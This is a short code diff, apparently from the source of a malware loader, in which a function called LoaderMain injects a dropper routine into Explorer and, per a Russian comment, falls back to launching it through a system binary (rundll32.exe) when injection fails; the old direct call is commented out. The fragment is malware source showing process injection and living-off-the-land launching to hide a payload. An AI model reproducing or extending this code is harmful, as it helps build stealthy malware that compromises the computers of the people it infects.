@@ -171,7 +171,11 @@ int APIENTRY LoaderMain()
 		if (!IsWIN64())
 			InExplorer = InjectIntoExplorer(DropperMainProc) != FALSE;
 		if (!InExplorer)
-			MegaJump(DropperMainProc);
+		{
+			// Инжект не удался, запускаем основную функцию через свхост
+			string ExeName = GetSpecialFolderPathA(CSIDL_SYSTEM, "rundll32.exe");
+			//MegaJump(DropperMainProc);
+		}
 	} 
 
 	
